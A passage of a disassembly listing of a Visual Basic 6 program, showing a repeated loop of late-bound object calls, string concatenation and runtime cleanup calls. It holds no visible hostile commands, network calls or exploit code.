0086DC51: push 00000001h
0086DC53: push 00000000h
0086DC55: push 00440E48h
0086DC5A: push 00000000h
0086DC5C: push 00000018h
0086DC5E: mov eax, [ebp+08h]
0086DC61: mov eax, [eax]
0086DC63: push [ebp+08h]
0086DC66: call [eax+00000320h]
0086DC6C: push eax
0086DC6D: lea eax, var_000000C4
0086DC73: push eax
0086DC74: call 00410A84h ; Set (object)
0086DC79: push eax
0086DC7A: lea eax, var_0000013C
0086DC80: push eax
0086DC81: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086DC86: add esp, 00000010h
0086DC89: push eax
0086DC8A: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086DC8F: push eax
0086DC90: lea eax, var_000000C8
0086DC96: push eax
0086DC97: call 00410A84h ; Set (object)
0086DC9C: push eax
0086DC9D: lea eax, var_0000014C
0086DCA3: push eax
0086DCA4: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086DCA9: add esp, 00000020h
0086DCAC: push eax
0086DCAD: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086DCB2: push eax
0086DCB3: lea eax, var_000000CC
0086DCB9: push eax
0086DCBA: call 00410A84h ; Set (object)
0086DCBF: push eax
0086DCC0: lea eax, var_0000015C
0086DCC6: push eax
0086DCC7: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086DCCC: add esp, 00000010h
0086DCCF: push eax
0086DCD0: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086DCD5: mov edx, eax
0086DCD7: lea ecx, var_5C
0086DCDA: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086DCDF: push eax
0086DCE0: call 00410A18h ; &
0086DCE5: mov edx, eax
0086DCE7: lea ecx, var_60
0086DCEA: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086DCEF: push eax
0086DCF0: push 00445568h
0086DCF5: call 00410A18h ; &
0086DCFA: mov edx, eax
0086DCFC: lea ecx, var_64
0086DCFF: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086DD04: push eax
0086DD05: push 00000010h
0086DD07: pop eax
0086DD08: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086DD0D: lea esi, var_00000310
0086DD13: mov edi, esp
0086DD15: movsd 
0086DD16: movsd 
0086DD17: movsd 
0086DD18: movsd 
0086DD19: push 00000001h
0086DD1B: push 00000010h
0086DD1D: push 00440E58h
0086DD22: push 00000010h
0086DD24: pop eax
0086DD25: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086DD2A: lea esi, var_00000300
0086DD30: mov edi, esp
0086DD32: movsd 
0086DD33: movsd 
0086DD34: movsd 
0086DD35: movsd 
0086DD36: push 00000001h
0086DD38: push 00000000h
0086DD3A: push 00440E48h
0086DD3F: push 00000000h
0086DD41: push 00000018h
0086DD43: mov eax, [ebp+08h]
0086DD46: mov eax, [eax]
0086DD48: push [ebp+08h]
0086DD4B: call [eax+00000320h]
0086DD51: push eax
0086DD52: lea eax, var_000000D0
0086DD58: push eax
0086DD59: call 00410A84h ; Set (object)
0086DD5E: push eax
0086DD5F: lea eax, var_0000016C
0086DD65: push eax
0086DD66: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086DD6B: add esp, 00000010h
0086DD6E: push eax
0086DD6F: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086DD74: push eax
0086DD75: lea eax, var_000000D4
0086DD7B: push eax
0086DD7C: call 00410A84h ; Set (object)
0086DD81: push eax
0086DD82: lea eax, var_0000017C
0086DD88: push eax
0086DD89: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086DD8E: add esp, 00000020h
0086DD91: push eax
0086DD92: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086DD97: push eax
0086DD98: lea eax, var_000000D8
0086DD9E: push eax
0086DD9F: call 00410A84h ; Set (object)
0086DDA4: push eax
0086DDA5: lea eax, var_0000018C
0086DDAB: push eax
0086DDAC: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086DDB1: add esp, 00000020h
0086DDB4: push eax
0086DDB5: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086DDBA: mov edx, eax
0086DDBC: lea ecx, var_68
0086DDBF: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086DDC4: push eax
0086DDC5: call 00410A18h ; &
0086DDCA: mov edx, eax
0086DDCC: lea ecx, var_6C
0086DDCF: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086DDD4: push eax
0086DDD5: push 00445568h
0086DDDA: call 00410A18h ; &
0086DDDF: mov edx, eax
0086DDE1: lea ecx, var_70
0086DDE4: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086DDE9: push eax
0086DDEA: push 00000010h
0086DDEC: pop eax
0086DDED: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086DDF2: lea esi, var_00000340
0086DDF8: mov edi, esp
0086DDFA: movsd 
0086DDFB: movsd 
0086DDFC: movsd 
0086DDFD: movsd 
0086DDFE: push 00000001h
0086DE00: push 00000010h
0086DE02: push 00440E58h
0086DE07: push 00000010h
0086DE09: pop eax
0086DE0A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086DE0F: lea esi, var_00000330
0086DE15: mov edi, esp
0086DE17: movsd 
0086DE18: movsd 
0086DE19: movsd 
0086DE1A: movsd 
0086DE1B: push 00000001h
0086DE1D: push 00000000h
0086DE1F: push 00440E48h
0086DE24: push 00000000h
0086DE26: push 00000018h
0086DE28: mov eax, [ebp+08h]
0086DE2B: mov eax, [eax]
0086DE2D: push [ebp+08h]
0086DE30: call [eax+00000320h]
0086DE36: push eax
0086DE37: lea eax, var_000000DC
0086DE3D: push eax
0086DE3E: call 00410A84h ; Set (object)
0086DE43: push eax
0086DE44: lea eax, var_0000019C
0086DE4A: push eax
0086DE4B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086DE50: add esp, 00000010h
0086DE53: push eax
0086DE54: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086DE59: push eax
0086DE5A: lea eax, var_000000E0
0086DE60: push eax
0086DE61: call 00410A84h ; Set (object)
0086DE66: push eax
0086DE67: lea eax, var_000001AC
0086DE6D: push eax
0086DE6E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086DE73: add esp, 00000020h
0086DE76: push eax
0086DE77: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086DE7C: push eax
0086DE7D: lea eax, var_000000E4
0086DE83: push eax
0086DE84: call 00410A84h ; Set (object)
0086DE89: push eax
0086DE8A: lea eax, var_000001BC
0086DE90: push eax
0086DE91: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086DE96: add esp, 00000020h
0086DE99: push eax
0086DE9A: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086DE9F: mov edx, eax
0086DEA1: lea ecx, var_74
0086DEA4: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086DEA9: push eax
0086DEAA: call 00410A18h ; &
0086DEAF: mov edx, eax
0086DEB1: lea ecx, var_78
0086DEB4: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086DEB9: push eax
0086DEBA: push 00445568h
0086DEBF: call 00410A18h ; &
0086DEC4: mov edx, eax
0086DEC6: lea ecx, var_7C
0086DEC9: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086DECE: push eax
0086DECF: push 00000010h
0086DED1: pop eax
0086DED2: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086DED7: lea esi, var_00000370
0086DEDD: mov edi, esp
0086DEDF: movsd 
0086DEE0: movsd 
0086DEE1: movsd 
0086DEE2: movsd 
0086DEE3: push 00000001h
0086DEE5: push 00000010h
0086DEE7: push 00440E58h
0086DEEC: push 00000010h
0086DEEE: pop eax
0086DEEF: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086DEF4: lea esi, var_00000360
0086DEFA: mov edi, esp
0086DEFC: movsd 
0086DEFD: movsd 
0086DEFE: movsd 
0086DEFF: movsd 
0086DF00: push 00000001h
0086DF02: push 00000000h
0086DF04: push 00440E48h
0086DF09: push 00000000h
0086DF0B: push 00000018h
0086DF0D: mov eax, [ebp+08h]
0086DF10: mov eax, [eax]
0086DF12: push [ebp+08h]
0086DF15: call [eax+00000320h]
0086DF1B: push eax
0086DF1C: lea eax, var_000000E8
0086DF22: push eax
0086DF23: call 00410A84h ; Set (object)
0086DF28: push eax
0086DF29: lea eax, var_000001CC
0086DF2F: push eax
0086DF30: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086DF35: add esp, 00000010h
0086DF38: push eax
0086DF39: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086DF3E: push eax
0086DF3F: lea eax, var_000000EC
0086DF45: push eax
0086DF46: call 00410A84h ; Set (object)
0086DF4B: push eax
0086DF4C: lea eax, var_000001DC
0086DF52: push eax
0086DF53: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086DF58: add esp, 00000020h
0086DF5B: push eax
0086DF5C: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086DF61: push eax
0086DF62: lea eax, var_000000F0
0086DF68: push eax
0086DF69: call 00410A84h ; Set (object)
0086DF6E: push eax
0086DF6F: lea eax, var_000001EC
0086DF75: push eax
0086DF76: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086DF7B: add esp, 00000020h
0086DF7E: push eax
0086DF7F: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086DF84: mov edx, eax
0086DF86: lea ecx, var_80
0086DF89: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086DF8E: push eax
0086DF8F: call 00410A18h ; &
0086DF94: mov edx, eax
0086DF96: lea ecx, var_00000084
0086DF9C: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086DFA1: push eax
0086DFA2: push 00445568h
0086DFA7: call 00410A18h ; &
0086DFAC: mov edx, eax
0086DFAE: lea ecx, var_00000088
0086DFB4: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086DFB9: push eax
0086DFBA: push 00000010h
0086DFBC: pop eax
0086DFBD: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086DFC2: lea esi, var_000003A0
0086DFC8: mov edi, esp
0086DFCA: movsd 
0086DFCB: movsd 
0086DFCC: movsd 
0086DFCD: movsd 
0086DFCE: push 00000001h
0086DFD0: push 00000010h
0086DFD2: push 00440E58h
0086DFD7: push 00000010h
0086DFD9: pop eax
0086DFDA: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086DFDF: lea esi, var_00000390
0086DFE5: mov edi, esp
0086DFE7: movsd 
0086DFE8: movsd 
0086DFE9: movsd 
0086DFEA: movsd 
0086DFEB: push 00000001h
0086DFED: push 00000000h
0086DFEF: push 00440E48h
0086DFF4: push 00000000h
0086DFF6: push 00000018h
0086DFF8: mov eax, [ebp+08h]
0086DFFB: mov eax, [eax]
0086DFFD: push [ebp+08h]
0086E000: call [eax+00000320h]
0086E006: push eax
0086E007: lea eax, var_000000F4
0086E00D: push eax
0086E00E: call 00410A84h ; Set (object)
0086E013: push eax
0086E014: lea eax, var_000001FC
0086E01A: push eax
0086E01B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086E020: add esp, 00000010h
0086E023: push eax
0086E024: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086E029: push eax
0086E02A: lea eax, var_000000F8
0086E030: push eax
0086E031: call 00410A84h ; Set (object)
0086E036: push eax
0086E037: lea eax, var_0000020C
0086E03D: push eax
0086E03E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086E043: add esp, 00000020h
0086E046: push eax
0086E047: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086E04C: push eax
0086E04D: lea eax, var_000000FC
0086E053: push eax
0086E054: call 00410A84h ; Set (object)
0086E059: push eax
0086E05A: lea eax, var_0000021C
0086E060: push eax
0086E061: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086E066: add esp, 00000020h
0086E069: push eax
0086E06A: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086E06F: mov edx, eax
0086E071: lea ecx, var_0000008C
0086E077: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086E07C: push eax
0086E07D: call 00410A18h ; &
0086E082: mov edx, eax
0086E084: lea ecx, var_00000090
0086E08A: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086E08F: push eax
0086E090: push 00445568h
0086E095: call 00410A18h ; &
0086E09A: mov edx, eax
0086E09C: lea ecx, var_00000094
0086E0A2: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086E0A7: push eax
0086E0A8: push 00000010h
0086E0AA: pop eax
0086E0AB: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086E0B0: lea esi, var_000003D0
0086E0B6: mov edi, esp
0086E0B8: movsd 
0086E0B9: movsd 
0086E0BA: movsd 
0086E0BB: movsd 
0086E0BC: push 00000001h
0086E0BE: push 00000010h
0086E0C0: push 00440E58h
0086E0C5: push 00000010h
0086E0C7: pop eax
0086E0C8: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086E0CD: lea esi, var_000003C0
0086E0D3: mov edi, esp
0086E0D5: movsd 
0086E0D6: movsd 
0086E0D7: movsd 
0086E0D8: movsd 
0086E0D9: push 00000001h
0086E0DB: push 00000000h
0086E0DD: push 00440E48h
0086E0E2: push 00000000h
0086E0E4: push 00000018h
0086E0E6: mov eax, [ebp+08h]
0086E0E9: mov eax, [eax]
0086E0EB: push [ebp+08h]
0086E0EE: call [eax+00000320h]
0086E0F4: push eax
0086E0F5: lea eax, var_00000100
0086E0FB: push eax
0086E0FC: call 00410A84h ; Set (object)
0086E101: push eax
0086E102: lea eax, var_0000022C
0086E108: push eax
0086E109: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086E10E: add esp, 00000010h
0086E111: push eax
0086E112: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086E117: push eax
0086E118: lea eax, var_00000104
0086E11E: push eax
0086E11F: call 00410A84h ; Set (object)
0086E124: push eax
0086E125: lea eax, var_0000023C
0086E12B: push eax
0086E12C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086E131: add esp, 00000020h
0086E134: push eax
0086E135: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086E13A: push eax
0086E13B: lea eax, var_00000108
0086E141: push eax
0086E142: call 00410A84h ; Set (object)
0086E147: push eax
0086E148: lea eax, var_0000024C
0086E14E: push eax
0086E14F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086E154: add esp, 00000020h
0086E157: push eax
0086E158: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086E15D: mov edx, eax
0086E15F: lea ecx, var_00000098
0086E165: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086E16A: push eax
0086E16B: call 00410A18h ; &
0086E170: mov edx, eax
0086E172: lea ecx, var_0000009C
0086E178: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086E17D: push eax
0086E17E: push 00445568h
0086E183: call 00410A18h ; &
0086E188: mov edx, eax
0086E18A: lea ecx, var_000000A0
0086E190: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086E195: push eax
0086E196: push 00000010h
0086E198: pop eax
0086E199: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086E19E: lea esi, var_00000400
0086E1A4: mov edi, esp
0086E1A6: movsd 
0086E1A7: movsd 
0086E1A8: movsd 
0086E1A9: movsd 
0086E1AA: push 00000001h
0086E1AC: push 00000010h
0086E1AE: push 00440E58h
0086E1B3: push 00000010h
0086E1B5: pop eax
0086E1B6: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086E1BB: lea esi, var_000003F0
0086E1C1: mov edi, esp
0086E1C3: movsd 
0086E1C4: movsd 
0086E1C5: movsd 
0086E1C6: movsd 
0086E1C7: push 00000001h
0086E1C9: push 00000000h
0086E1CB: push 00440E48h
0086E1D0: push 00000000h
0086E1D2: push 00000018h
0086E1D4: mov eax, [ebp+08h]
0086E1D7: mov eax, [eax]
0086E1D9: push [ebp+08h]
0086E1DC: call [eax+00000320h]
0086E1E2: push eax
0086E1E3: lea eax, var_0000010C
0086E1E9: push eax
0086E1EA: call 00410A84h ; Set (object)
0086E1EF: push eax
0086E1F0: lea eax, var_0000025C
0086E1F6: push eax
0086E1F7: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086E1FC: add esp, 00000010h
0086E1FF: push eax
0086E200: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086E205: push eax
0086E206: lea eax, var_00000110
0086E20C: push eax
0086E20D: call 00410A84h ; Set (object)
0086E212: push eax
0086E213: lea eax, var_0000026C
0086E219: push eax
0086E21A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086E21F: add esp, 00000020h
0086E222: push eax
0086E223: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086E228: push eax
0086E229: lea eax, var_00000114
0086E22F: push eax
0086E230: call 00410A84h ; Set (object)
0086E235: push eax
0086E236: lea eax, var_0000027C
0086E23C: push eax
0086E23D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086E242: add esp, 00000020h
0086E245: push eax
0086E246: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086E24B: mov edx, eax
0086E24D: lea ecx, var_000000A4
0086E253: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086E258: push eax
0086E259: call 00410A18h ; &
0086E25E: mov edx, eax
0086E260: lea ecx, var_000000A8
0086E266: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086E26B: push eax
0086E26C: push 00445568h
0086E271: call 00410A18h ; &
0086E276: mov edx, eax
0086E278: lea ecx, var_000000AC
0086E27E: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086E283: push eax
0086E284: push 00000010h
0086E286: pop eax
0086E287: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086E28C: lea esi, var_00000430
0086E292: mov edi, esp
0086E294: movsd 
0086E295: movsd 
0086E296: movsd 
0086E297: movsd 
0086E298: push 00000001h
0086E29A: push 00000010h
0086E29C: push 00440E58h
0086E2A1: push 00000010h
0086E2A3: pop eax
0086E2A4: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086E2A9: lea esi, var_00000420
0086E2AF: mov edi, esp
0086E2B1: movsd 
0086E2B2: movsd 
0086E2B3: movsd 
0086E2B4: movsd 
0086E2B5: push 00000001h
0086E2B7: push 00000000h
0086E2B9: push 00440E48h
0086E2BE: push 00000000h
0086E2C0: push 00000018h
0086E2C2: mov eax, [ebp+08h]
0086E2C5: mov eax, [eax]
0086E2C7: push [ebp+08h]
0086E2CA: call [eax+00000320h]
0086E2D0: push eax
0086E2D1: lea eax, var_00000118
0086E2D7: push eax
0086E2D8: call 00410A84h ; Set (object)
0086E2DD: push eax
0086E2DE: lea eax, var_0000028C
0086E2E4: push eax
0086E2E5: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086E2EA: add esp, 00000010h
0086E2ED: push eax
0086E2EE: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086E2F3: push eax
0086E2F4: lea eax, var_0000011C
0086E2FA: push eax
0086E2FB: call 00410A84h ; Set (object)
0086E300: push eax
0086E301: lea eax, var_0000029C
0086E307: push eax
0086E308: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086E30D: add esp, 00000020h
0086E310: push eax
0086E311: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086E316: push eax
0086E317: lea eax, var_00000120
0086E31D: push eax
0086E31E: call 00410A84h ; Set (object)
0086E323: push eax
0086E324: lea eax, var_000002AC
0086E32A: push eax
0086E32B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086E330: add esp, 00000020h
0086E333: push eax
0086E334: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086E339: mov edx, eax
0086E33B: lea ecx, var_000000B0
0086E341: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086E346: push eax
0086E347: call 00410A18h ; &
0086E34C: mov edx, eax
0086E34E: lea ecx, var_000000B4
0086E354: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086E359: push eax
0086E35A: push 00445568h
0086E35F: call 00410A18h ; &
0086E364: mov edx, eax
0086E366: lea ecx, var_000000B8
0086E36C: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086E371: push eax
0086E372: push 00000010h
0086E374: pop eax
0086E375: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086E37A: lea esi, var_00000460
0086E380: mov edi, esp
0086E382: movsd 
0086E383: movsd 
0086E384: movsd 
0086E385: movsd 
0086E386: push 00000001h
0086E388: push 00000010h
0086E38A: push 00440E58h
0086E38F: push 00000010h
0086E391: pop eax
0086E392: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086E397: lea esi, var_00000450
0086E39D: mov edi, esp
0086E39F: movsd 
0086E3A0: movsd 
0086E3A1: movsd 
0086E3A2: movsd 
0086E3A3: push 00000001h
0086E3A5: push 00000000h
0086E3A7: push 00440E48h
0086E3AC: push 00000000h
0086E3AE: push 00000018h
0086E3B0: mov eax, [ebp+08h]
0086E3B3: mov eax, [eax]
0086E3B5: push [ebp+08h]
0086E3B8: call [eax+00000320h]
0086E3BE: push eax
0086E3BF: lea eax, var_00000124
0086E3C5: push eax
0086E3C6: call 00410A84h ; Set (object)
0086E3CB: push eax
0086E3CC: lea eax, var_000002BC
0086E3D2: push eax
0086E3D3: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086E3D8: add esp, 00000010h
0086E3DB: push eax
0086E3DC: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086E3E1: push eax
0086E3E2: lea eax, var_00000128
0086E3E8: push eax
0086E3E9: call 00410A84h ; Set (object)
0086E3EE: push eax
0086E3EF: lea eax, var_000002CC
0086E3F5: push eax
0086E3F6: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086E3FB: add esp, 00000020h
0086E3FE: push eax
0086E3FF: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086E404: push eax
0086E405: lea eax, var_0000012C
0086E40B: push eax
0086E40C: call 00410A84h ; Set (object)
0086E411: push eax
0086E412: lea eax, var_000002DC
0086E418: push eax
0086E419: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086E41E: add esp, 00000020h
0086E421: push eax
0086E422: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086E427: mov edx, eax
0086E429: lea ecx, var_000000BC
0086E42F: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086E434: push eax
0086E435: call 00410A18h ; &
0086E43A: mov edx, eax
0086E43C: lea ecx, var_000000C0
0086E442: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086E447: push eax
0086E448: push 00441264h ; vbCrLf
0086E44D: call 00410A18h ; &
0086E452: mov edx, eax
0086E454: lea ecx, var_44
0086E457: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086E45C: lea eax, var_000000C0
0086E462: push eax
0086E463: lea eax, var_000000BC
0086E469: push eax
0086E46A: lea eax, var_000000B8
0086E470: push eax
0086E471: lea eax, var_000000B4
0086E477: push eax
0086E478: lea eax, var_000000B0
0086E47E: push eax
0086E47F: lea eax, var_000000AC
0086E485: push eax
0086E486: lea eax, var_000000A8
0086E48C: push eax
0086E48D: lea eax, var_000000A4
0086E493: push eax
0086E494: lea eax, var_000000A0
0086E49A: push eax
0086E49B: lea eax, var_0000009C
0086E4A1: push eax
0086E4A2: lea eax, var_00000098
0086E4A8: push eax
0086E4A9: lea eax, var_00000094
0086E4AF: push eax
0086E4B0: lea eax, var_00000090
0086E4B6: push eax
0086E4B7: lea eax, var_0000008C
0086E4BD: push eax
0086E4BE: lea eax, var_00000088
0086E4C4: push eax
0086E4C5: lea eax, var_00000084
0086E4CB: push eax
0086E4CC: lea eax, var_80
0086E4CF: push eax
0086E4D0: lea eax, var_7C
0086E4D3: push eax
0086E4D4: lea eax, var_78
0086E4D7: push eax
0086E4D8: lea eax, var_74
0086E4DB: push eax
0086E4DC: lea eax, var_70
0086E4DF: push eax
0086E4E0: lea eax, var_6C
0086E4E3: push eax
0086E4E4: lea eax, var_68
0086E4E7: push eax
0086E4E8: lea eax, var_64
0086E4EB: push eax
0086E4EC: lea eax, var_60
0086E4EF: push eax
0086E4F0: lea eax, var_5C
0086E4F3: push eax
0086E4F4: push 0000001Ah
0086E4F6: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0086E4FB: add esp, 0000006Ch
0086E4FE: lea eax, var_0000012C
0086E504: push eax
0086E505: lea eax, var_00000128
0086E50B: push eax
0086E50C: lea eax, var_00000124
0086E512: push eax
0086E513: lea eax, var_00000120
0086E519: push eax
0086E51A: lea eax, var_0000011C
0086E520: push eax
0086E521: lea eax, var_00000118
0086E527: push eax
0086E528: lea eax, var_00000114
0086E52E: push eax
0086E52F: lea eax, var_00000110
0086E535: push eax
0086E536: lea eax, var_0000010C
0086E53C: push eax
0086E53D: lea eax, var_00000108
0086E543: push eax
0086E544: lea eax, var_00000104
0086E54A: push eax
0086E54B: lea eax, var_00000100
0086E551: push eax
0086E552: lea eax, var_000000FC
0086E558: push eax
0086E559: lea eax, var_000000F8
0086E55F: push eax
0086E560: lea eax, var_000000F4
0086E566: push eax
0086E567: lea eax, var_000000F0
0086E56D: push eax
0086E56E: lea eax, var_000000EC
0086E574: push eax
0086E575: lea eax, var_000000E8
0086E57B: push eax
0086E57C: lea eax, var_000000E4
0086E582: push eax
0086E583: lea eax, var_000000E0
0086E589: push eax
0086E58A: lea eax, var_000000DC
0086E590: push eax
0086E591: lea eax, var_000000D8
0086E597: push eax
0086E598: lea eax, var_000000D4
0086E59E: push eax
0086E59F: lea eax, var_000000D0
0086E5A5: push eax
0086E5A6: lea eax, var_000000CC
0086E5AC: push eax
0086E5AD: lea eax, var_000000C8
0086E5B3: push eax
0086E5B4: lea eax, var_000000C4
0086E5BA: push eax
0086E5BB: push 0000001Bh
0086E5BD: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086E5C2: add esp, 00000070h
0086E5C5: lea eax, var_000002DC
0086E5CB: push eax
0086E5CC: lea eax, var_000002CC
0086E5D2: push eax
0086E5D3: lea eax, var_000002BC
0086E5D9: push eax
0086E5DA: lea eax, var_000002AC
0086E5E0: push eax
0086E5E1: lea eax, var_0000029C
0086E5E7: push eax
0086E5E8: lea eax, var_0000028C
0086E5EE: push eax
0086E5EF: lea eax, var_0000027C
0086E5F5: push eax
0086E5F6: lea eax, var_0000026C
0086E5FC: push eax
0086E5FD: lea eax, var_0000025C
0086E603: push eax
0086E604: lea eax, var_0000024C
0086E60A: push eax
0086E60B: lea eax, var_0000023C
0086E611: push eax
0086E612: lea eax, var_0000022C
0086E618: push eax
0086E619: lea eax, var_0000021C
0086E61F: push eax
0086E620: lea eax, var_0000020C
0086E626: push eax
0086E627: lea eax, var_000001FC
0086E62D: push eax
0086E62E: lea eax, var_000001EC
0086E634: push eax
0086E635: lea eax, var_000001DC
0086E63B: push eax
0086E63C: lea eax, var_000001CC
0086E642: push eax
0086E643: lea eax, var_000001BC
0086E649: push eax
0086E64A: lea eax, var_000001AC
0086E650: push eax
0086E651: lea eax, var_0000019C
0086E657: push eax
0086E658: lea eax, var_0000018C
0086E65E: push eax
0086E65F: lea eax, var_0000017C
0086E665: push eax
0086E666: lea eax, var_0000016C
0086E66C: push eax
0086E66D: lea eax, var_0000015C
0086E673: push eax
0086E674: lea eax, var_0000014C
0086E67A: push eax
0086E67B: lea eax, var_0000013C
0086E681: push eax
0086E682: push 0000001Bh
0086E684: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086E689: add esp, 00000070h
0086E68C: mov var_04, 0000001Dh
0086E693: lea eax, var_000004C8
0086E699: push eax
0086E69A: lea eax, var_000004B8
0086E6A0: push eax
0086E6A1: lea eax, var_30
0086E6A4: push eax
0086E6A5: call 00410A36h ; Next
0086E6AA: mov var_00000508, eax
0086E6B0: cmp var_00000508, 00000000h
0086E6B7: jnz 0086D9C4h
0086E6BD: mov var_04, 0000001Eh
0086E6C4: cmp [008F529Ch], 00000000h
0086E6CB: jnz 86E6E8h
0086E6CD: push 008F529Ch
0086E6D2: push 00440F2Ch
0086E6D7: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086E6DC: mov var_0000052C, 008F529Ch
0086E6E6: jmp 86E6F2h
0086E6E8: mov var_0000052C, 008F529Ch
0086E6F2: mov eax, var_0000052C
0086E6F8: mov eax, [eax]
0086E6FA: mov var_0000047C, eax
0086E700: lea eax, var_000000C4
0086E706: push eax
0086E707: mov eax, var_0000047C
0086E70D: mov eax, [eax]
0086E70F: push var_0000047C
0086E715: call [eax+1Ch]
0086E718: fclex 
0086E71A: mov var_00000480, eax
0086E720: cmp var_00000480, 00000000h
0086E727: jnl 86E749h
0086E729: push 0000001Ch
0086E72B: push 00440F1Ch
0086E730: push var_0000047C
0086E736: push var_00000480
0086E73C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0086E741: mov var_00000530, eax
0086E747: jmp 86E750h
0086E749: and var_00000530, 00000000h
0086E750: mov eax, var_000000C4
0086E756: mov var_00000484, eax
0086E75C: mov eax, var_00000484
0086E762: mov eax, [eax]
0086E764: push var_00000484
0086E76A: call [eax+50h]
0086E76D: fclex 
0086E76F: mov var_00000488, eax
0086E775: cmp var_00000488, 00000000h
0086E77C: jnl 86E79Eh
0086E77E: push 00000050h
0086E780: push 00445554h
0086E785: push var_00000484
